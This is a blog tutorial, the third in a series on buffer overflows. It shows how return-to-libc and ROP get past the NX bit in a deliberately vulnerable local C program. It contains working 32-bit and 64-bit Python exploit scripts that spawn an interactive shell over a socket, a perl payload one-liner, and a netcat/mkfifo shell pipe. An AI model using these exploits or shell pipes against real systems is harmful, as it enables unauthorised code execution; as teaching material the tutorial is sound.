---
layout: post
title: Modern Buffer Overflows (Part III) - The NX Bit
author: Austin Howard
excerpt: The NX Bit and DEP make the stack non-executable, are buffer overflows possible if the code to be executed can't be written into the process?

---

[Part I](../Modern-Buffer-Overflows) delved into the design and operation of the
x86 processor during program execution, leaving the reader with a fairly good
understanding of what makes buffer overflow exploitation possible. 
[Part II](../Modern-Buffer-Overflows-Part2) followed up with an explanation of
shellcode writing and used the product to exploit the vulnerability examined in
Part I. For the exploit in Part II to work several protections were turned off,
namely, Address Space Layout Randomization (ASLR), the no-execute bit (NX Bit),
and the stack canary. While there may be a few legitimate reasons to turn any
one of these protections off, the vast majority of executables in the wild will
have (almost) all of them turned on by default. This post dives into the NX Bit
and how it can be overcome using some more modern exploitation techniques.

## The NX Bit Explained ##

Part II left off after having exploited the buffer overflow examined in Part I.
This exploit was accomplished by:

 * Extracting executable binary instructions from a compiled object file (AKA
   shellcode).
 * Writing the shellcode into the vulnerable application's memory space,
   specifically on the stack.
 * Overwriting the saved instruction pointer on the stack with a pointer to the
   shellcode (also on the stack).

When the program returns from the vulnerable function it begins executing
instructions stored in the location pointed to by the (now overwritten) saved
instruction pointer.

The reason that attack worked is because the vulnerable application allowed
read, write, and execute permissions to the memory region mapped to the stack.
In Linux, every file as well as every memory region of a program has file
permissions. The most common of the permissions determine whether a read, write,
or execute operation is permitted on the file or memory region. In modern
applications, under normal circumstances, any particular memory region is mapped
either read/execute or read/write, but never all three. In Part I the vulnerable
application that was exploited in Part II was compiled with the `-z execstack`
flag. This enables the execute permission on the memory region mapped to the
stack, and, because it is the stack (a data storage area), it is already marked
read/write.

The no-execute bit (NX Bit) is a reference to the executable permission being
unset (off) on any memory region also marked read and write. This can easily be
observed on modern applications by looking at the permissions column of any
processes' `/proc/{pid}/maps` file.

** Note: The Windows equivalent of the NX Bit is called Data Execution
Prevention or DEP **

```
[howard@sterling bof]$ pidof cat
16604
[howard@sterling bof]$ cat /proc/16604/maps
00400000-0040c000 r-xp 00000000 08:02 2893873           /usr/bin/cat
0060b000-0060c000 r--p 0000b000 08:02 2893873           /usr/bin/cat
0060c000-0060d000 rw-p 0000c000 08:02 2893873           /usr/bin/cat
0060d000-0062e000 rw-p 00000000 00:00 0                 [heap]
7ffff785b000-7ffff7a3c000 r--p 00000000 08:02 2905881   /usr/lib/locale/locale-archive
7ffff7a3c000-7ffff7bd1000 r-xp 00000000 08:02 2886815   /usr/lib/libc-2.24.so
7ffff7bd1000-7ffff7dd0000 ---p 00195000 08:02 2886815   /usr/lib/libc-2.24.so
7ffff7dd0000-7ffff7dd4000 r--p 00194000 08:02 2886815   /usr/lib/libc-2.24.so
7ffff7dd4000-7ffff7dd6000 rw-p 00198000 08:02 2886815   /usr/lib/libc-2.24.so
7ffff7dd6000-7ffff7dda000 rw-p 00000000 00:00 0 
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:02 2886814   /usr/lib/ld-2.24.so
7ffff7fb3000-7ffff7fd7000 rw-p 00000000 00:00 0 
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0         [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0         [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:02 2886814   /usr/lib/ld-2.24.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:02 2886814   /usr/lib/ld-2.24.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0         [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
```

The maps file of any process lists all the memory regions mapped to a process,
the address to which the region is mapped, and the permissions it is mapped
with. The next-to-last line of this output shows the memory region mapped to the
stack. In this case, the stack is mapped with `rw-p` permissions. This is the
normal case and means the memory has been allocated with read and write private
permissions. The "private" in this case refers to a copy-on-write operation which
is a memory saving technique outside the scope of this article. The program that
was exploited in Part II would have had this memory region mapped `rwxp` which
is what allowed data to be executed as if it were normal instructions.

More information on the maps file is available on the [proc manual
page](http://man7.org/linux/man-pages/man5/proc.5.html). 

More information on the "private" flag can be gained from the 
[mmap manual page](http://man7.org/linux/man-pages/man2/mmap.2.html).

More information on copy-on-write in the [blog series by Ville
Laurikari](http://hackerboss.com/copy-on-write-101-part-1-what-is-it/).


## Flipping The NX Bit ##

Given that most modern applications have no reason to have the no execute bit
turned off, what needs to be done to overcome this protection? Revisiting the
technique used in Part II, the only step that no longer works is executing the
attacker written instructions. Seeing as no one memory location can be both
executed from and written to, there is little room to reuse the same techniques
from before.

### Return To libc ###

Since the exploit cannot write nefarious instructions into the process with
any hope of executing them, why not use the instructions that are already there?
Part II focused mainly on calling the `execve` system call from assembly, which
gave full control over the target's stack. If the C equivalent of `execve` were
already available in the target application then it would be the perfect return
address -- if the arguments to it could be controlled.

The x86 32-bit C Application Binary Interface (ABI) specifies that arguments to
functions are to be passed in reverse order on the stack. This means that if a
function has the signature `void func(int a, char * b, char * c[])`, then a
caller would be expected to do the equivalent of `push c; push b; push a; call
func`.

Given this information it sounds like the arguments can be controlled by
writing them to the stack above the saved instruction pointer. This new exploit
will still need an address to return to, and `execve` could be most
desireable, if we can manage to get that function into the processes' address
space.

The `exec*` family of functions is included as part of libc which is a standard
set of functions used in C programs. It is the standard library of the C
language, and as you may have guessed is already included with all C programs.
Even if the function is not called directly from the program it is loaded into
the program's memory space by the loader when the program starts executing. In
fact, the entire library libc is loaded into the processes' memory space. When
compilers started marking the stack non-executable some clever hackers came to
this conclusion and thus birthed the technique known as Return To libc
(ret2libc).

Return to libc works because before the loader starts executing a program it
loads the ELF (executable and linkable format) executable into memory. The ELF
contains information including all the instructions of the program itself, as
well as the names and locations of any shared objects (SOs) it was linked
against. The loader then follows all links for all SOs and loads them into
memory in the same fashion. For this stage of loading the program into memory,
the loader does not attempt to discrimate about which portions of the SOs are
used or not used, it just loads the whole library into the processes' memory
segement. Any ELF's SO dependencies can be viewed prior to load time by using
the `ldd` utility as such:

```
[howard@sterling bof]$ ldd easy32
    linux-gate.so.1 (0xf7fd8000)
    libc.so.6 => /usr/lib32/libc.so.6 (0xf7dfa000)
    /lib/ld-linux.so.2 (0xf7fda000)
```

There are three libraries linked to the executable exploited in the previous
article as shown above. One of these libraries, is indeed libc. The entry for
libc shows the exact file that the ELF has been linked against
(`/usr/lib/libc.so.6`) and even the exact memory address that it will be mapped
to when the ELF is loaded (`0xf7dfa000`). The reason the memory address is shown
is because ASLR is turned off, this would not normally be shown as it is secret
information.

Since libc is mapped into memory at a known location, the only step left will be
finding where within libc the `execve` function resides. The man page for ELF
lays out the format for the headers of ELF executables and libraries. The
structures and explanations of the fields detail how SOs will be mapped into
memory including suggested offsets, and offsets from the beginning of the file.
The Linux utility `nm` will allow finding the offsets from the beginning of a
SO or executable to any symbols that are located in the file, including
functions. Searching the output of `nm` for a function should yield a few
entries:

```
[howard@sterling bof]$ nm /usr/lib32/libc.so.6  | grep execve
000b27c0 W execve
000b27c0 t __execve
000b27f0 T fexecve
000b27c0 t __GI_execve
000b27c0 t __GI___execve
```

The output from `nm` includes three columns: the offset from the beginning of
the file, the symbol type, and the symbol name. In this particular case there
are four aliases for `execve` all residing the Text section (code) and one of
which is a weak symbol.

Before going any further, let us compile a new vulnerable program for the
purposes of this exploit. The new program will use the `read` and `write` calls
instead of `strcpy` like the first vulnerable program uses. The reason is that
`strcpy` stops copying when it encounters a null byte, which is generally the
marker for the end of a C-string. This becomes more important when exploiting
the 64-bit version of the program toward the end of this post. For consistency
in showing the differences between exploitation on 32-bit and 64-bit we will use
the same source code for both exploits.

```C
/**
 * Compile:
 *   32-bit:
 *      gcc -o med32 -m32 -fno-stack-protector med.c
 *   64-bit:
 *      gcc -o med64 -fno-stack-protector med.c
 *
 * Turn off ASLR:
 *      sudo systctl -w kernel.randomize_va_space=0
**/ 

#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>


void vulnerable() {
    char buf[1024];

    memset(buf, 0x0, 1024);

    write(1, "Enter some text: ", 17);
    read(0, buf, 2048);

    printf("Your string: %s", buf);
}

int main(int argc, char * argv[], char * envp[]) {
    vulnerable();
    return 0;
}
```

#### Exploitation ####

Using the starting location of libc (`0xf7dfa000`) and adding the offset to
`execve` (`0x000b27c0`), the location in the processes' memory space of the
return address should be `0xf7eac7c0`. This can be verified by starting the
program inside gdb and inspecting the memory at that address:

```
[howard@sterling bof]$ gdb -q ./med32
Reading symbols from ./med32...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048504
(gdb) r
Starting program: /home/howard/repos/bof/med32 

Breakpoint 1, 0x08048504 in main ()
(gdb) x/i 0xf7eac7c0
   0xf7eac7c0 <execve>:     push   %ebx
(gdb) 
   0xf7eac7c1 <execve+1>:   mov    0x10(%esp),%edx
(gdb) 
   0xf7eac7c5 <execve+5>:   mov    0xc(%esp),%ecx
(gdb) 
   0xf7eac7c9 <execve+9>:   mov    0x8(%esp),%ebx
(gdb)
```

When first loading the program, the debugger will only load the ELF and
statically linked libraries into memory. It is not until the program is running
that the loader will load the shared objects into memory. For this reason, a
breakpoint is set at main and the program is started before inspecting the
memory. The debugger confirms that the `execve` call starts at the address
`0xf7eac7c0`, yielding the return address needed to complete the exploit. The
first few lines of `execve` show it loading the arguments from the stack, recall
the signature: `int execve(const char *path, char *const argv[], char *const
envp[]);`.

The last segment to figure out in order to write a working exploit is how to
place the arguments to `execve` in a known location inside the process. Because
this program does no checking of the input to the main function, it could be
perfectly acceptable to pass this information via `argv` parameter to main. If
the program did do input validation, `envp` would also be an acceptable place to
put this information, though it makes the exploit slightly more complicated.

Having the address of a function to return to, the parameters it takes, and the
necessary layout of the stack, the only thing left to do is gather the addresses
of the parameters as they are passed into `main`:

```
[howard@sterling bof]$ gdb -q med32
Reading symbols from med32...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048504
(gdb) r /bin/sh -p
Starting program: /home/howard/repos/bof/med32 /bin/sh -p

Breakpoint 1, 0x08048504 in main ()
(gdb) x/xw $esp
0xffffda1c: 0xf7e12196
(gdb) 
0xffffda20: 0x00000003
(gdb) 
0xffffda24: 0xffffdab4
(gdb) 
0xffffda28: 0xffffdac4
(gdb) 
0xffffda2c: 0x00000000
(gdb) x/xw 0xffffdab4
0xffffdab4: 0xffffdc29
(gdb) 
0xffffdab8: 0xffffdc46
(gdb) 
0xffffdabc: 0xffffdc4e
(gdb) 
0xffffdac0: 0x00000000
(gdb) x/s 0xffffdc46
0xffffdc46: "/bin/sh"
(gdb) 
0xffffdc4e: "-p"
```

The addresses of our new pointer to argv, argv[0], and evp are enough to
complete the exploit. The last tricky part is that our entire exploit needs to
be read from standard in, and can't be passed as part of argv to main. We can
simply use a text file pre-filled with the exploit data and use redirection for
standard in.

```
[howard@sterling bof]$ perl -e 'print "A"x0x408, "B"x4, "\xc0\xc7\xea\xf7", "C"x4, "\x46\xdc\xff\xff", "\xb8\xda\xff\xff", "c4\xda\xff\xff"' > exp
[howard@sterling bof]$ gdb -q med32 
Reading symbols from med32...(no debugging symbols found)...done.
(gdb) r /bin/sh -p <exp
Starting program: /home/howard/repos/bof/med32 /bin/sh -p <exp
Enter some text: Your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAprocess
1728 is executing new program: /usr/bin/bash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
[Inferior 1 (process 1728) exited normally]
(gdb)
```

The exploit is laid out as such:
 * 0x408 "A"s to fill the buffer and stack up to the saved %ebp
 * 0x4   "B"s to overwrite the saved %ebp
 * 0x4   Bytes to overwrite the saved %eip with the address of `execve`
 * 0x4   "C"s This section of stack is overwritten by `execve` when it executes
   the first instruction (`push %ebp`)
 * 0x4   Bytes for the address to argv[0]
 * 0x4   Bytes for the address to argv
 * 0x4   Bytes for the address to envp (in this case use the envp passed to
   main)

The output from gdb indicates that the exploit successfully spawned the
execution of `/usr/bin/bash` (in this case `/bin/sh` is a symbolic link to
`/usr/bin/bash`). Furthermore, the last line of output suggests that bash
returned immediately with a normal exit code. This happens because standard in
is inherited from the parent process, and in this case has already been closed.
Since bash reads commands from standard in, when it sees the file descriptor has
been closed it exits gracefullly.

The new requirement for the exploit is that standard in needs to be replaced
by a file descriptor which can be flushed without being closed. We need to flush
the file descriptor to notify `read` that data is available, but it can't
accomplish this by sending the EOF character.

A network socket fits the bill perfectly, additionally it will allow the exploit
to read and write to the same file descriptor. Because the target application is
expecting to read from standard in and not a network socket, the netcat utility
and file redirection can be used to network the target application. By default,
netcat will listen for a connection and redirect the network socket output to
standard out while redirecting standard in to the socket. From the netcat manual
page, the following commands will accomplish a network accessible program:

```
$ rm -f /tmp/f; mkfifo /tmp/f
$ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
```

The mkfifo command simply creates a named pipe; think of it sort of like
creating a file that represents standard in or standard out. In this case, the
named pipe can be read from and written to. The usage of the cat command in the
example takes all the contents of `/tmp/f` and outputs it to standard out. Using
the pipe character `|`, standard out from the cat command is redirected to
standard in of the next command. Next, `/bin/sh` is executed as an interactive
shell redirecting standard err to standard out. Since standard in has been
redirected to be anything output by `cat /tmp/f`, essentially anything written
to `/tmp/f` will be executed in `/bin/sh`. The last part redirects standard out
and standard err to the standard in of `nc` (netcat) which is listening for
connections on 127.0.0.1:1234. Standard out from netcat is redirected to
`/tmp/f` completing the cycle such that anything that comes into the network
socket is writen to `/tmp/f`; likewise, anything written to standard out from
`/bin/sh` is written to the network socket.

This workflow necessitates writing a utility to connect to the listening port,
write the exploit string, and then interact with the shell. Python can make
quick work of this because of its abstractions around network sockets and
writing byte arrays. As with parts one and two of this series, the actual
addresses used for argv, argv[0], and envp may need to change because of
environment differences. Because the program is now blocking until it receives
text from standard in, there is an opportunity to attach to it with gdb and
check out the stack to get the precise addresses.

In one shell start the program and let it hang waiting for input from the user:

```
[howard@sterling bof]$ cat input | /home/howard/repos/bof/med32 /bin/sh -p 2>&1 | nc -l 127.0.0.1 -p 1234 >input


```

In another shell connect to the program with gdb and look around the stack to
find the correct values:

```
[howard@sterling bof]$ pidof med32
1929
[howard@sterling bof]$ sudo gdb -q ./med32 1929
Reading symbols from ./med32...(no debugging symbols found)...done.
Attaching to program: /home/howard/repos/bof/med32, process 1929
Reading symbols from /usr/lib32/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
0xf7fd8c99 in __kernel_vsyscall ()
(gdb) x/xw 0xffffdab8
0xffffdab8: 0xffffdc37
(gdb) 
0xffffdabc: 0xffffdc3f
(gdb) 
0xffffdac0: 0x00000000
(gdb) x/s 0xffffdc37
0xffffdc37: "/bin/sh"
(gdb) 
0xffffdc3f: "-p"
(gdb) x/s 0xffffdc42
0xffffdc42: "XDG_VTNR=2"
(gdb) 
```

In this case the pointers to argv and envp stayed the same, but the pointer to argv[0] has
changed to `0xffffdc37`. Equipped with all the correct addresses, the exploit
can be written as such:

```python
import os
import sys
import struct
import socket

word_size = 4
execve_address = 0xf7eac7c0
argv_zero_address = 0xffffdc37
argv_address = 0xffffdab8
envp_address = 0xffffdac4
buffer_size = 0x408

def main(ip, port):
    payload = b''
    payload += b'A' * buffer_size # fill the buffer
    payload += b'B' * word_size # overwrite saved ebp
    payload += struct.pack("@I", execve_address) # overwrite saved eip
    payload += struct.pack("@I", 0x0) # data overwritten by execve
    payload += struct.pack("@I", argv_zero_address)
    payload += struct.pack("@I", argv_address)
    payload += struct.pack("@I", envp_address)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))

    print(s.recv(2048)) # Read the initial output from the program
    s.send(payload)

    while (not s._closed):
        s.send(input("# ").encode() + b"\n")
        print(s.recv(2048))
    
    s.close()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: {} <ip> <port>".format(sys.argv[0]))
        exit(-1);

    main(sys.argv[1], sys.argv[2])
```

The program starts by creating the same exploit string we initially piped into a
file, adjusting the addresses for correctness. Next, it opens a socket and reads
out the initial output from the vulnerable program. Finally, it sends the exploit
which should result in a new shell, after which it waits for user input to pipe
across the network to the shell. Now the the exploit has been codified,
exploitation is as simple as shown:

```
[howard@sterling bof]$ python exploits/med32_exp.py 127.0.0.1 1234
b'Enter some text: '
# whoami
b'howard\n'
# ls
b'core\neasy32\neasy64\neasy.c\nexp\nexploits\ngdb-env\ngdb-s.env\nhard32\nhard.c\ninput\nMakefile\nmed32\nmed64\nNOTES\noutput\nshellcodes\nshell.env\nshell-s.env\ntools\n'
```

The output from the shell could be formatted better, but the exploit does the
trick and drops the user to a shell. At this point, the reader may be thinking
the same trick will work for x86_64 exploitation with a few address changes. The
next section examines why that isn't entirely true, and one trick for when the 
NX bit is enabled on a x86_64 vulnerable program.

### Return Oriented Programming ###

As was mentioned in a previous post of this series, the C function calling
conventions differ between x86 and x86_64. In 32-bit mode all parameters are
passed via the stack such that the first argument is closest the stack frame,
and the last argument farthest from the stack frame. In 64-bit mode this is
changed by passing the first six integral or pointer arguments via registers
(`%rdi, %rsi, %rdx, %rcx, %r8, %r9`); all remaining arguments are passed via the
stack. This small caveat makes it slightly harder to exploit the `med.c`
vulnerable program on a 64-bit architecture.

All the fundamentals that made the return to libc attack successful in the last
section, still hold true in the 64-bit exploit. This time around, however, the
arguments need to be passed via registers rather than the stack. The easiest way
to get values into registers is to simply pop them off the stack into the
appropriate register and continue on with the rest of the instructions. [Return
Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
(or ROP) is the art of finding small instructions sets
within a program which do just that. The small instruction sets, which are 
just a portion of an actual subroutine, used in ROP are often
refered to as gadgets. Particularly, before returning to the `execve` function,
the registers `%rdi`, `%rsi`, and `%rdx` need to be filled with argv[0], argv,
and envp respectively. Any set of gadgets that accomplish popping the values
into the desired registers and ending with a return statement will nicely fit
the criteria to make the exploit work. The return statement at the end is
crucial because it pops from the stack, which after the buffer overflow is
attacker controlled thus giving the attacker control of the instruction pointer.

There are many freely available tools for finding ROP gadgets hidden in a
program, but for this example I'll be using
[rp++](https://github.com/0vercl0k/rp). It is fairly easy to use, but my main
reason for choosing it is that it supports the AT&T syntax of assembly. Start by
compiling the vulnerable program, and pointing rp++ at it with a small maximum
gadget length:

```
[howard@sterling bof]$ gcc -o med64 -fno-stack-protector med.c
[howard@sterling bof]$ ../rp/rp-lin-x64 -f ./med64 --atsyntax -r 3
Trying to open './med64'..
Loading ELF information..
FileFormat: Elf, Arch: x64
Using the AT&T syntax..

Wait a few seconds, rp++ is looking for gadgets..
in PHDR
0 found.

in LOAD
103 found.

A total of 103 gadgets found.
0x00400532: adcb %ah, 0x00(%rax) ; jmpq *%rax ;  (1 found)
0x00400580: adcb %ah, 0x00(%rax) ; jmpq *%rax ;  (1 found)
...
0x004006ce: popq %r13 ; popq %r14 ; popq %r15 ; ret  ;  (1 found)
0x004006d0: popq %r14 ; popq %r15 ; ret  ;  (1 found)
0x004006d2: popq %r15 ; ret  ;  (1 found)
0x004006cf: popq %rbp ; popq %r14 ; popq %r15 ; ret  ;  (1 found)
0x00400540: popq %rbp ; ret  ;  (1 found)
0x004006d3: popq %rdi ; ret  ;  (1 found)
0x004006d1: popq %rsi ; popq %r15 ; ret  ;  (1 found)
...
[howard@sterling bof]$
```

There is a lot of output from this command, much of which is of no use for this
exploit and has been elided for brevity. The last two instructions shown are of
particular concern because they pop two of the registers needed to complete the
exploit, and one extra register which is of no concern. Unfortunately, however,
the output does not include an instruction to pop the value of `%rdx`. The role
of `%rdx` in the `execve` call is a pointer to the environment for the new
command. The shell's basic functionality can work just fine without this, so
there is no use going out of the way to properly set it. For this exploit, it
can safely be ignored.

The address of the gadgets is given as the first column. Theoretically, after the
buffer overflow, the stack should be set up to return to one of these gadgets 
where its popped value sets on top. On top of the popped value is the other 
gadget's address followed by its' popped value, finally followed by the address
for `execve`. To put this all in motion, first figure out the return address for
`execve` as well as the pointers to the arguments:

```
[howard@sterling bof]$ gdb -q ./med64
Reading symbols from ./med64...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400643 <+0>:push   %rbp
   0x0000000000400644 <+1>:mov    %rsp,%rbp
   0x0000000000400647 <+4>:sub    bashx20,%rsp
   0x000000000040064b <+8>:mov    %edi,-0x4(%rbp)
   0x000000000040064e <+11>:mov    %rsi,-0x10(%rbp)
   0x0000000000400652 <+15>:mov    %rdx,-0x18(%rbp)
   0x0000000000400656 <+19>:mov    bashx0,%eax
   0x000000000040065b <+24>:callq  0x4005d6 <vulnerable>
   0x0000000000400660 <+29>:mov    bashx0,%eax
   0x0000000000400665 <+34>:leaveq 
   0x0000000000400666 <+35>:retq   
End of assembler dump.
(gdb) b *main
Breakpoint 1 at 0x400643
(gdb) r /bin/sh -p
Starting program: /home/howard/repos/bof/med64 /bin/sh -p

Breakpoint 1, 0x0000000000400643 in main ()
(gdb) i R
rax            0x400643         4195907
rbx            0x0              0
rcx            0x0              0
rdx            0x7fffffffe9a8   140737488349608
rsi            0x7fffffffe988   140737488349576
rdi            0x3              3
rbp            0x400670         0x400670 <__libc_csu_init>
rsp            0x7fffffffe8a8   0x7fffffffe8a8
r8             0x4006e0         4196064
r9             0x7ffff7de9900   140737351948544
r10            0x0              0
r11            0x7ffff7b98d00   140737349520640
r12            0x4004e0         4195552
r13            0x7fffffffe980   140737488349568
r14            0x0              0
r15            0x0              0
rip            0x400643         0x400643 <main>
eflags         0x246            [ PF ZF IF ]
cs             0x33             51
ss             0x2b             43
ds             0x0              0
es             0x0              0
fs             0x0              0
gs             0x0              0
(gdb) x/xg 
0x7fffffffe988: 0x00007fffffffec29
(gdb) 
0x7fffffffe990: 0x00007fffffffec46
(gdb) 
0x7fffffffe998: 0x00007fffffffec4e
(gdb) 
0x7fffffffe9a0: 0x0000000000000000
(gdb) x/s 0x00007fffffffec46
0x7fffffffec46: "/bin/sh"
(gdb) 
0x7fffffffec4e: "-p"
(gdb)
```

This shows the addresses of the first two arguments to `execve`, `argv[0]`
(`0x7fffffffec46`) and `argv` (`0x7fffffffe9a0`). These will need to be adjusted
for the environment outside of the debugger, but give a good place to start
looking in the live environment. Just as in the 32-bit version, start the program
with input and output attached through a pipe to netcat, then attach to the
process with gdb.

```
[howard@sterling bof]$ cat input | /home/howard/repos/bof/med64 /bin/sh -p 2>&1 | nc -l 127.0.0.1 -p 1234 >input &
[1] 5931
[howard@sterling bof]$ pidof med64
5930
[howard@sterling bof]$ sudo gdb -q ./med64 5930
Reading symbols from ./med64...(no debugging symbols found)...done.
Attaching to program: /home/howard/repos/bof/med64, process 5930
Reading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.
0x00007ffff7b174d0 in __read_nocancel () from /usr/lib/libc.so.6
(gdb) x/xg 0x7fffffffe990
0x7fffffffe990: 0x0000000000000000
(gdb) 
0x7fffffffe998: 0x00007fffffffec3c
(gdb) 
0x7fffffffe9a0: 0x00007fffffffec47
(gdb) x/xg 0x7fffffffe980
0x7fffffffe980: 0x00007fffffffec31
(gdb) x/s 0x00007fffffffec31
0x7fffffffec31: "/bin/sh"
(gdb) 
0x7fffffffec39: "-p"
```

This time the stack has shifted 16 bytes down (lower addresses), which is
evident by the `null` value stored in the expected location of `argv`. After
adjustments the new locations are `0x7fffffffe980` and `0x7fffffffec31` for
`argv` and `argv[0]` respectively. Now that all the addresses are known, the
previous exploit script can be modified to exploit the 64-bit version of the
vulnerable program using a combination of ROP and return to libc.

```
import os
import sys
import struct
import socket

word_size = 8
execve_address = 0x7ffff7af4470
argv_zero_address = 0x00007fffffffec31
argv_address = 0x7fffffffe980

pop_rdi_address = 0x004006d3 # pop %rdi; ret
pop_rsi_address = 0x004006d1 # pop %rsi; pop %r15; ret

buffer_size = 0x400

def main(ip, port=""):
    payload = b''
    payload += b'A' * buffer_size # fill the buffer
    payload += b'B' * word_size # overwrite saved rbp
    payload += struct.pack("@Q", pop_rdi_address) # overwrite saved rip
    payload += struct.pack("@Q", argv_zero_address) # what we are poping into rdi
    payload += struct.pack("@Q", pop_rsi_address) # next return address
    payload += struct.pack("@Q", argv_address) # what we are popping into rsi
    payload += struct.pack("@Q", 0x0) #junk to pop into r15
    payload += struct.pack("@Q", execve_address) # next return address

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))

    print(s.recv(2048))

    s.send(payload)

    while (not s._closed):
        s.send(input("# ").encode() + b"\n")
        print(s.recv(2048))
    
    s.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: {} <ip> <port>".format(sys.argv[0]))
        exit(-1);

    main(*sys.argv[1:])
```

The exploit works mostly the same as the 32-bit version, but instead of return
directly to `execve` with some data on the stack, it returns to the gadgets
found with `rp++`. The first return address points to the gadget that pops a
value off the stack into `%rdi` which should hold the address of `argv[0]`.
Directly above that is the pointer to `argv[0]` because this is where `%rsp`
will pointing when the pop instruction executes. Directly above `argv[0]` on our
fabricated stack is the address to the next pop instruction. Since this gadget
pops two values -- `%rsi` and `%r15` -- there need to be two values to pop off the
stack. This exploit does not care what the value of `%r15` is, so any value will
do; in this case it has been set to all zeros. Finally the stack and registers
have been setup appropriately and the pointer to `execve` is the last return
address on the stack.

```
[howard@sterling bof]$ cat input | /home/howard/repos/bof/med64 /bin/sh -p 2>&1 | nc -l 127.0.0.1 -p 1234 >input &
[1] 5998
[howard@sterling bof]$ pidof med64
5997
[howard@sterling bof]$ python exploits/med64_exp.py 127.0.0.1 1234
b'Enter some text: '
# whoami
b'howard\n'
# ls
b'Makefile\nNOTES\ncore\neasy.c\neasy32\neasy64\nexp\nexploits\ngdb-env\ngdb-s.env\nhard.c\nhard32\ninput\nmed32\nmed64\noutput\nshell-s.env\nshell.env\nshellcodes\ntools\n'
# exit
b''
```

## Conclusions ##

Several new techniques were explored in this part of the series focusing mainly
on ROP and return to libc to overcome the non-executable stack protection. The
NX-bit only provides a small amount of security when it comes to exploiting a
buffer overflow. It prevents the attacker from writing his/her own instructions
directly into the programs memory space. However, if the instructions are
already loaded into the process, this protection is ineffective.

The exploits have shown that this protection is only a minor hinderance to gaining
full control of a process via a buffer overflow. The next article of the
series, which will focus on Address Space Layout Randomization, will show how
ASLR in combination with the NX-bit will make exploitation much harder. The
final article in the series will look into StackGuard and the stack canary. By
the end of the series the reader should be convinced that buffer overflows are
still very capable of being exploited in a modern system. Ultimately the
programmer is responsible for protecting against these kinds of exploits, and no
amount of kernel or compiler protections can make up for faulty code.
